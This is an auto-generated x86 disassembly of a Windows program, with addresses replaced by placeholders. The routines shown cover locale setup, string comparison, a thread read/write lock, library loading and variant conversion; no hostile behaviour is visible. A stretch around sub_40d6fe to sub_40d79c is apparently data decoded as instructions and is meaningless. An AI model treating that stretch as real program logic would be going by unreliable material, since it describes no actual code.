je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_40456c
add eax ebx
dec eax
call sub_40c6a0
add eax ebx
sub_40c740
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_40436c
cmp ebx eax
jg r-xdata
cmp [ esi + ebx - 0x1 ] 0x5c
jne r-xdata
mov edx ebx
mov eax esi
call sub_40c490
test al al
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_40c774
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx esi
call sub_404100
mov eax [ ebx ]
call sub_40436c
mov edx eax
mov eax [ ebx ]
call sub_40c740
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx r-xdata
call sub_404374
sub_40c7b4
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_40456c
push eax
mov eax esi
call sub_40456c
mov ebp eax
mov eax ebp
pop edx
call sub_40c7ec
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c7ec
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408908
mov [ esp ] eax
mov eax ebp
call sub_408908
mov edi eax
mov edx ebp
mov eax esi
call sub_408aa0
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c4b4
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408aa0
mov ebx eax
inc ebx
sub_40c88c
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c8b4
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c8b4
test eax eax
jne r-xdata
sub_40c8b4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408a8c
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c4b4
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408a8c
mov edi eax
test edi edi
jne r-xdata
sub_40c8f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c958
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_40431c
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_408400
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c95f
lea eax [ ebp - 0xc ]
call sub_4040ac
retn
sub_40c968
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c8f4
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c9e0
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c9c8
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c968
pop ecx
push ebp
call sub_40c968
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402de8
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40cb54
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40ce1f
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c9e0
call sub_40b3d0
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b320
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_404100
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b320
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_408400
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b320
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_408400
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b36c
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b36c
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b320
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_408400
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b36c
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b320
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b658
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_404100
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b320
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b658
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_404100
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b36c
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b320
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_404100
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b320
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_404100
lea eax [ ebp - 0x8 ]
call sub_4040ac
lea eax [ ebp - 0xc ]
call sub_4040ac
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b320
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_408400
test eax eax
jne r-xdata
call sub_40b5a8
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404144
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404144
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_40442c
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_40442c
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b36c
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ce26
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_4040d0
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b320
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_408400
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b320
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_408400
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404144
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404144
jmp r-xdata
sub_40cecc
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40cfef
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404144
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404144
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_408044
lea edx [ ebp - 0xc ]
mov eax edi
call sub_408044
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_404144
mov eax esi
call sub_4040ac
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_40c7b4
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cff6
lea eax [ ebp - 0x14 ]
mov edx 0x4
call sub_4040d0
retn
push [ esi ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_4045cc
push [ ebp - 0x14 ]
push [ ebp - 0x4 ]
mov eax esi
mov edx 0x3
call sub_40442c
lea eax [ ebp - 0x10 ]
push eax
mov eax edi
call sub_40436c
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x10 ]
call sub_4045cc
test [ ebp + 0xc ] 0x1
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404374
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
call sub_40436c
mov edx eax
add edx ebx
mov ecx 0x7fffffff
mov eax [ ebp - 0x8 ]
call sub_4045cc
mov eax esi
mov edx [ ebp - 0x10 ]
call sub_404374
jmp r-xdata
sub_40d008
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_40d098
push [ fs : eax ]
mov [ fs : eax ] esp
call GetLastError
mov ebx eax
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb98
mov edx eax
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] 0x0
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40b2d4
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bbd4
mov edx eax
jmp r-xdata
mov [ edx + 0xc ] ebx
mov eax edx
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d09f
lea eax [ ebp - 0x14 ]
call sub_4040ac
retn
sub_40d0f0
push ebx
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
pop ebx
retn
mov eax sub_408894
mov [ rw-data ] eax
sub_40d174
push ebx
push esi
push edi
push ebp
call sub_403664
mov ebx edx
mov edi eax
xor esi esi
inc esi
cmp esi 0x10
jne r-xdata
mov eax ebp
mov ebp [ ebp ]
call sub_40270c
test ebp ebp
jne r-xdata
mov ebp [ edi + esi * 4 + 0x4 ]
xor eax eax
mov [ edi + esi * 4 + 0x4 ] eax
test ebp ebp
je r-xdata
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4032a0
test bl bl
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40364c
sub_40d1dc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax edi
call sub_40d1c4
mov ebx eax
call GetCurrentThreadId
mov esi eax
xor eax eax
mov al bl
mov ebp [ edi + eax * 4 + 0x4 ]
jmp r-xdata
test ebp ebp
je r-xdata
test ebp ebp
jne r-xdata
cmp esi [ ebp + 0x4 ]
jne r-xdata
mov eax [ esp ]
mov [ eax ] ebp
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d264
mov ebp eax
test ebp ebp
jne r-xdata
mov ebp [ ebp ]
mov eax 0x10
call sub_407e80
mov ebp eax
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] 0x7fffffff
mov [ ebp ] ebp
xor eax eax
mov al bl
lea eax [ edi + eax * 4 + 0x4 ]
mov edx ebp
call sub_40d164
mov [ ebp ] eax
sub_40d264
push ebx
mov ebx eax
mov eax ebx
call sub_40d1c4
and eax 0xff
mov ebx [ ebx + eax * 4 + 0x4 ]
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
lea eax [ ebx + 0x8 ]
mov edx 0x7fffffff
call sub_40d164
cmp eax 0x7fffffff
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
call GetCurrentThreadId
mov [ ebx + 0x4 ] eax
jmp r-xdata
sub_40d2a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403280
mov [ esi + 0xc ] 0xffff
push 0x0
push 0xffffffff
push 0xffffffff
push 0x0
call CreateEventA
mov [ esi + 0x10 ] eax
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403280
mov [ esi + 0x20 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035fc
mov eax esi
pop esi
pop ebx
retn
call sub_403654
pop [ fs : 0x0 ]
add esp 0xc
sub_40d318
push ebx
push esi
call sub_403664
mov ebx edx
mov esi eax
mov eax esi
call sub_40d3a4
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032a0
mov eax [ esi + 0x10 ]
push eax
call CloseHandle
mov eax [ esi + 0x14 ]
push eax
call CloseHandle
mov eax [ esi + 0x20 ]
call sub_4032b0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40364c
sub_40d3a4
push ebx
push esi
push edi
push ebp
push ecx
mov edi eax
mov bl 0x1
call GetCurrentThreadId
mov esi eax
cmp esi [ edi + 0x24 ]
je r-xdata
inc [ edi + 0x1c ]
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40d360
mov ebp [ edi + 0x28 ]
mov edx esp
mov eax [ edi + 0x20 ]
call sub_40d1dc
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
seta bl
test bl bl
je r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff0001
call sub_40d16c
cmp eax 0xffff
jne r-xdata
lea eax [ edi + 0xc ]
call sub_40d14c
jmp r-xdata
lea eax [ edi + 0xc ]
mov edx 0xffff
call sub_40d16c
test eax eax
je r-xdata
mov eax edi
call sub_40d360
test bl bl
je r-xdata
mov eax edi
call sub_40d394
mov [ edi + 0x24 ] esi
lea eax [ edi + 0x28 ]
call sub_40d14c
dec eax
cmp eax ebp
sete bl
lea eax [ edi + 0xc ]
call sub_40d158
sub_40d440
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d1dc
dec [ ebx + 0x1c ]
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0xc ]
mov edx 0xffff
call sub_40d16c
mov eax ebx
call sub_40d378
mov eax ebx
call sub_40d36c
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d254
sub_40d490
push ebx
push esi
push ecx
mov esi eax
mov edx esp
mov eax [ esi + 0x20 ]
call sub_40d1dc
mov eax [ esp ]
inc [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x1
seta bl
call GetCurrentThreadId
cmp eax [ esi + 0x24 ]
je r-xdata
pop edx
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax esi
call sub_40d384
jmp r-xdata
lea eax [ esi + 0xc ]
call sub_40d158
test eax eax
jle r-xdata
lea eax [ esi + 0xc ]
call sub_40d14c
cmp eax 0xffff
jne r-xdata
push 0x0
call Sleep
mov eax esi
call sub_40d384
mov eax esi
call sub_40d378
sub_40d4fc
push ebx
push ecx
mov ebx eax
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d1dc
mov eax [ esp ]
dec [ eax + 0xc ]
mov eax [ esp ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edx
pop ebx
retn
mov edx esp
mov eax [ ebx + 0x20 ]
call sub_40d254
call GetCurrentThreadId
cmp eax [ ebx + 0x24 ]
je r-xdata
lea eax [ ebx + 0xc ]
call sub_40d14c
mov ecx eax
cmp ecx 0xffff
jne r-xdata
test ecx ecx
jg r-xdata
mov eax ebx
call sub_40d378
jmp r-xdata
mov eax ecx
mov ecx 0xffff
cdq
idiv ecx
test edx edx
jne r-xdata
mov eax ebx
call sub_40d378
sub_40d574
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push edi
push esi
push ebx
mov eax [ ebx ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov al 0x1
sub_40d598
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40d60f
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x4 ]
call sub_405944
mov ecx eax
mov edx r-xdata
mov eax ebx
call sub_403364
test al al
je r-xdata
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d616
lea eax [ ebp - 0x4 ]
call sub_405944
retn
mov ecx edi
mov edx esi
mov eax ebx
call sub_403364
test al al
jne r-xdata
mov ecx edi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_40d574
test al al
jne r-xdata
mov al 0x1
sub_40d630
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
push edx
call SetErrorMode
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_40d6a2
push [ fs : eax ]
mov [ fs : eax ] esp
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_40d684
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40456c
push eax
call LoadLibraryA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d68b
fnclex
fldcw [ ebp - 0x2 ]
retn
sub_40d6fe
dec eax
add [ edx + eax * 8 - 0x25fbffb8 ] bh
dec eax
add [ edx + eax * 8 - 0x2717ffb8 ] dh
dec eax
add [ edx + eax * 8 - 0x270bffb8 ] ch
dec eax
add [ edx + eax * 8 - 0x2413ffb8 ] ah
dec eax
add [ edx + eax * 8 - 0x270fffb8 ] bl
dec eax
add [ edx + eax * 8 - 0x235fffb8 ] dl
dec eax
add [ edx + eax * 8 - 0x25a3ffb8 ] cl
dec eax
add [ edx + eax * 8 - 0x25cfffb8 ] al
dec eax
add [ edx + eax * 8 + 0x48 ] bh
add [ esp + ebx * 8 - 0x3d8bffb8 ] dh
dec eax
add [ eax - 0x24 ] cl
dec eax
add [ edx + eax * 8 + 0x48 ] ch
add [ ecx + ebx * 8 ] al
dec eax
add [ edx + eax * 8 + 0x48 ] ah
add ah dh
fisttp [ eax ]
pop esp
retn 0x48
sub_40d764
adc ah bl
dec eax
add [ edx + eax * 8 + 0x48 ] dl
add al dh
xlat
dec eax
add [ edx + eax * 8 + 0x48 ] cl
add [ edi + edx * 8 + 0x48 ] bh
add [ edx + eax * 8 + 0x48 ] al
add [ edx + ebx * 8 ] ah
dec eax
add [ edx + eax * 8 ] bh
dec eax
add [ eax ] cl
fisttp [ eax ]
xor al 0xc2
dec eax
add [ eax + 0x2c0048d6 ] ch
retn 0x48
sub_40d79c
add cl bl
dec eax
add [ eax ] ch
add [ eax ] al
add [ edx + eax * 8 ] bl
dec eax
add al cl
fisttp [ eax ]
add [ eax ] al
add [ eax ] al
sbb dl al
dec eax
add [ eax ] al
xlat
dec eax
add [ eax ] al
add [ eax ] al
add [ edx + eax * 8 ] dl
dec eax
add ah dh
fimul [ eax ]
add [ eax ] al
add [ eax ] al
adc dl al
dec eax
add [ esi + edx * 8 + 0x48 ] dh
add [ eax ] al
or al 0xc2
dec eax
add [ eax + 0x48d7 ] bh
add [ eax ] al
add [ eax ] cl
retn 0x48
sub_40db04
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40db6c
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db73
retn
mov eax sub_40d6b4
call sub_403dd4
mov eax r-xdata
call sub_403dfc
cmp [ rw-data ] 0x0
je r-xdata
call sub_40c198
call sub_40c29c
call sub_40d0f0
call sub_40cb54
mov eax rw-data
mov edx r-xdata
call sub_404100
sub_40dba4
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40dbf8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dc52
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404334
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_408418
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dc59
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40dc64
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dcbe
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404334
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4097b8
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dcc5
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40dcd0
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dd2a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404334
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40978c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd31
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40dd3c
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40dd96
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404334
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40b248
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dd9d
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40dda8
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40de02
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404334
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_4097e4
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de09
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40de14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40de81
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404334
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408524
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40de88
lea eax [ ebp - 0x8 ]
call sub_4040ac
retn
sub_40de94
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40def4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_409740
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404904
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40defb
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40df04
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40df64
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a9a0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_404904
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40df6b
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_40df74
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40dfd8
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
